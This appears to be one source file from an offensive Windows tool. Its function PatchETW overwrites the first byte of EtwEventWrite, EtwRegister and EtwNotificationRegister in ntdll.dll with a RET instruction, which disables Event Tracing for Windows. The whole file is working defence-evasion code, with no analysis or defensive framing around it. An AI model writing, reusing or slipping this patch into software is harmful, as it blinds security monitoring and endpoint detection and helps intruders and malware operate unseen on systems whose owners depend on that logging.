// etw.cpp
#include "etw.h"
#include <windows.h>
#include <iostream>

bool PatchETW() {
    const char* etwFuncs[] = {
        "EtwEventWrite",
        "EtwRegister",
        "EtwNotificationRegister"
    };

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;

    for (const char* funcName : etwFuncs) {
        void* funcAddr = GetProcAddress(ntdll, funcName);
        if (!funcAddr) continue;

        DWORD oldProtect;
        if (VirtualProtect(funcAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            *(BYTE*)funcAddr = 0xC3; // RET
            VirtualProtect(funcAddr, 1, oldProtect, &oldProtect);
        } else {
            std::cerr << "[-] Failed to unprotect: " << funcName << std::endl;
        }
    }

    return true;
}
